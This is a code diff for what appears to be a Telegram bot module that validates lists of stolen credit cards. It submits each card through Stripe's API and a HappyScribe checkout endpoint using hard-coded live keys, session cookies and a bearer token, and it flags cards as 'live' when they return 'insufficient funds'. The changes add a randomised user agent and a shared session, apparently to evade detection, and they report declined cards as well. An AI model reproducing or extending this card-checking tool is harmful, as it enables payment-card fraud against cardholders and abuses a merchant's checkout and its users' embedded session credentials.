@@ -4,6 +4,9 @@ import time
 import aiohttp
 from pyrogram import Client, filters
 from EQUROBOT import app
+import user_agent
+import random
+import string
 
 # Function to extract credit card details from the message text
 def extract_credit_card_details(message_text):
@@ -71,7 +74,7 @@ async def bin_lookup(bin_number):
                 return f"Error: Unable to retrieve BIN information (Status code: {response.status})"
 
 # Function to create a Stripe payment method
-def create_stripe_payment_method(ccn, mm, yy, cvv):
+def create_stripe_payment_method(ccn, mm, yy, cvv, session):
     headers = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
@@ -88,53 +91,44 @@ def create_stripe_payment_method(ccn, mm, yy, cvv):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
 
-    data = f'type=card&billing_details[name]=Hhg&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=91fbb521-dec9-4c76-8a30-db763fc485d44a83b0&muid=68b9b01b-e7ac-4f0e-93d3-fd61d4a9cab3935f67&sid=8152f767-b5bf-4c00-a90e-81d5262832d6715ab4&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=32334&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'
+    data = f'type=card&billing_details[name]=User&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=guid&muid=muid&sid=sid&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=26722&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'
 
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     return response.json().get('id')
 
 # Function to confirm the payment
-def confirm_payment(payment_method_id):
+def confirm_payment(payment_method_id, session):
     cookies = {
-        'ahoy_visitor': '1f532397-581b-4f95-a667-2370c55ae926',
-        'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-22T18%3A46%3A20.546Z%22%2C%22consentId%22%3A%224fc44b3b-9d38-4f72-852a-a06b50b77292%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-22T18%3A46%3A20.546Z%22%7D',
-        '_gcl_au': '1.1.1241378566.1716403581',
-        'intercom-device-id-frdatdus': '2c5ddf8e-59c7-4199-9815-82245c5daeb3',
-        'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVGswTnpNME5sMHNJbmszVldacFZHWmthRUZpU2tWUVpXaDJNMHd0SWl3aU1UY3hOalF3TXpZeU9TNHpOamt4TWpnaVhRPT0iLCJleHAiOiIyMDI0LTA1LTI5VDE4OjQ3OjA5LjM2OVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--0df545370eb506f06655a31fd198d26fec6ca03b',
+        'ahoy_visitor': 'aa9059eb-6025-4c9c-8c93-06b2e7f66bf1',
+        'ahoy_visit': '80f8e7d9-33d9-4a44-a389-d3886d799439',
+        'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D',
+        '_gcl_au': '1.1.191496317.1716898280',
+        '_gid': 'GA1.2.1548126584.1716898280',
+        'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3',
         'unsecure_is_signed_in': '1',
-        '_cioid': '11947346',
-        '__stripe_mid': '68b9b01b-e7ac-4f0e-93d3-fd61d4a9cab3935f67',
-        'ahoy_visit': '7fedd670-f9d6-4c54-a4ac-6c3fa2c5fc24',
-        '_ga': 'GA1.2.1201600738.1716403570',
-        '_gid': 'GA1.2.1234188292.1716777675',
+        '_cioid': '11296645',
+        'intercom-device-id-frdatdus': '65896fd8-9074-419f-82af-44775a9800f5',
+        '__stripe_mid': 'ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5',
+        '__stripe_sid': 'e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d',
         '_gat_UA-97995424-1': '1',
-        'intercom-session-frdatdus': 'NFZEQjlKY0t1dUMyM2hwN0NqT2I3Rm5YWHVTY3BLaG9qb3JUeDJDTDhrcUdDNm1qRktzNERzMHNLcGt0V0VHVy0tQmlvbGtlYTlCZmF3WStqWHVXcXFxUT09--605b33f745246c869fa563efb6a366154020cbd2',
-        '_ga_4T8KCV9Y2D': 'GS1.1.1716777674.4.1.1716777683.51.0.0',
-        '__stripe_sid': '8152f767-b5bf-4c00-a90e-81d5262832d6715ab4',
-        '_transcribe_session': 'gNnlLC1Wo2%2FGKDkUT%2B9eEHJvRM7pCSX62VbVti4ilnJ2vQEzmi1trInmJk9l0HLdFcsy5fVtsNL8C377Hf4pCF5c%2BEIy%2FHMRCIyZXdJxLZcEH%2BwRc2kzcC2WYShcsjvo1Imw79TpkzUTFwSm6uhyHWNSm4jJiI0TRZABJS5feV1yygELAGxiyuWVnjsgAxnou99uLIpO4NSJbB87AF1NY1rry9qLVR6BGFAKw1AZZL2uEn%2FzD%2FY3iXtZMilLYddXZ%2B8KcHSvof0J6wVAkfo8z5bA3khEu8lS26Py0QoB%2BMVX7EXOb%2B3fsnBVVf9O4PFuY63qSumhWo8JYj5blj31O51Z%2BhAtS9FAby6RValiK8DD9YoUtsJDfWdnAIbGi%2BNxdLoJl8qxwn9THj5NZDY2sUHgYg%3D%3D--gt4ad5nhsiL4XeD6--8kcGD5T7tOu0yRDtheQbsw%3D%3D',
+        '_ga': 'GA1.1.1213546217.1716898279',
+        '_ga_4T8KCV9Y2D': 'GS1.1.1716911386.2.1.1716911702.60.0.0',
+        'intercom-session-frdatdus': 'WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d',
+        '_transcribe_session': 'GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7'
     }
 
     headers = {
         'authority': 'www.happyscribe.com',
         'accept': 'application/json',
         'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-        'authorization': 'Bearer EsVfB1j947HZeJUWaD718Qtt',
+        'authorization': 'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
         'content-type': 'application/json',
-        'origin': 'https://www.happyscribe.com',
-        'referer': 'https://www.happyscribe.com/v2/11453735/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
 
     json_data = {
         'id': 11132807,
         'address': 'Eee',
-        'name': 'Hhg',
+        'name': 'User',
         'country': 'US',
         'vat': None,
         'billing_account_id': 11132807,
@@ -152,7 +146,7 @@ def confirm_payment(payment_method_id):
         'extra_plan_hours': None,
     }
 
-    response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
+    response = session.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
     time.sleep(3)
     return response.json().get('error', '')
 
@@ -169,22 +163,26 @@ async def process_document(client, message):
     total_cards = len(lines)
     processed_cards = 0
     live_cards = []
+    dead_cards = []
 
-    for i in range(0, total_cards, 3):
-        batch = lines[i:i+3]
-        for line in batch:
-            cards = extract_credit_card_details(line.strip())
-            if cards:
-                ccn, mm, yy, cvv = cards[0]
-                payment_method_id = create_stripe_payment_method(ccn, mm, yy, cvv)
-                if not payment_method_id:
-                    continue
+    session = requests.Session()
+    session.headers.update({'User-Agent': user_agent.generate_user_agent()})
 
-                error_message = confirm_payment(payment_method_id)
-                if "card has insufficient funds" in error_message:
-                    P = f"{ccn}|{mm}|{yy}|{cvv}"
-                    bin_info = await bin_lookup(ccn[:6])
-                    live_cards.append(f'''
+    for i in range(0, total_cards):
+        line = lines[i].strip()
+        cards = extract_credit_card_details(line)
+        if cards:
+            ccn, mm, yy, cvv = cards[0]
+            payment_method_id = create_stripe_payment_method(ccn, mm, yy, cvv, session)
+            if not payment_method_id:
+                continue
+
+            error_message = confirm_payment(payment_method_id, session)
+            bin_info = await bin_lookup(ccn[:6])
+            P = f"{ccn}|{mm}|{yy}|{cvv}"
+
+            if "card has insufficient funds" in error_message:
+                live_message = f'''
 ┏━━━━━━━⍟
 ┃STRIPE AUTH 𝟓$ ✅
 ┗━━━━━━━━━━━⊛
@@ -194,15 +192,30 @@ async def process_document(client, message):
 
 {bin_info}
 ⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
-                    ''')
+                '''
+                live_cards.append(live_message)
+                await message.reply_text(live_message)
+            else:
+                dead_message = f'''
+┏━━━━━━━⍟
+┃DECLINED ❌
+┗━━━━━━━━━━━⊛      
+➩ 𝗖𝗮𝗿𝗱 ➜ `{P}`
+➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {error_message}
+➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : DEAD ❌
 
-        processed_cards += len(batch)
+{bin_info}
+⌛ 𝗧𝗶𝗺𝗲: {time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
+                '''
+                dead_cards.append(dead_message)
+                await message.reply_text(dead_message)
+
+        processed_cards += 1
         await message.reply_text(f'Processed {processed_cards}/{total_cards} cards.')
 
+    await message.reply_text(f'Total cards: {total_cards}\nProcessed cards: {processed_cards}')
     if live_cards:
         await message.reply_text('\n'.join(live_cards))
-    else:
-        await message.reply_text('No live cards found.')
-
-    await message.reply_text(f'Total cards: {total_cards}\nProcessed cards: {processed_cards}')
-      
+    if dead_cards:
+        await message.reply_text('\n'.join(dead_cards))
+        
